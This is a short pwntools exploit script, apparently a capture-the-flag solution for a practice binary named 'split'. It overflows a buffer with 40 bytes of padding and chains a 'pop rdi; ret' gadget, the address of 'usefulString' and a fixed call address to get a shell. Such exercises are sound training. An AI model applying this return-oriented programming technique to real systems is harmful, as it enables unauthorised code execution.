from pwn import *
context(arch='amd64', os='linux')
junk = b'A'*40
p = process('./split')
#p = gdb.debug('./split', 'b main')
print(p.recvuntil(b'> '))
e = ELF('./split')
r = ROP(e)
gadget = r.find_gadget(['pop rdi', 'ret'])
print(hex(e.symbols['usefulString']))
print(p64(gadget[0]))
print(p64(e.symbols['usefulString']))
print(p64(0x000000000040074b))

p.sendline(junk + p64(gadget[0]) + p64(e.symbols['usefulString']) + p64(0x000000000040074b))

print(p.recvline())
p.interactive()
#0x000000000040074b